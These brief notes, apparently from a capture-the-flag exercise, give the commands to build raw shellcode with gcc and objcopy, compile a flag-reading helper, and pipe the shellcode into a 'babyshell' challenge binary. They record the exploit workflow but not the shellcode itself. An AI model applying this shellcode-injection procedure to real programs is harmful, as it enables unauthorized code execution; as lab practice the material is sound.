### shellcode.c compilation
    gcc -static -nostdlib -o shellcode-elf shellcode.s
    objcopy --dump-section .text=shellcode-raw shellcode-elf

### cayflag.c compilation
    gcc -o catflag catflag.c
    
### exploit run
    (cat shellcode-raw;cat) | /babyshell_level1_testing1
